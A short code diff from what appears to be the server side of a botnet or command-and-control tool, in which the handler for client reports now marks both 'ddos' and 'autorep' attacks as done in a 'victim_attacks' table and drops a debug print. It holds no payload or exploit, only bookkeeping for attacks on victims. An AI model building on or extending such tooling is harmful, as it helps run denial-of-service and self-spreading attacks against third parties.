@@ -287,8 +287,7 @@ def start_server(port, logger):
                     attack_output = client_message["output"]
 
                     # Mise à jour de l'attaque
-                    if attack_type == "ddos":
-                        print("DDOS UPDATED")
+                    if attack_type == "ddos" or attack_type == "autorep":
                         query = "UPDATE victim_attacks SET state = 'done', result = 'done' WHERE id = %s"
                         values = (attack_id, )
 
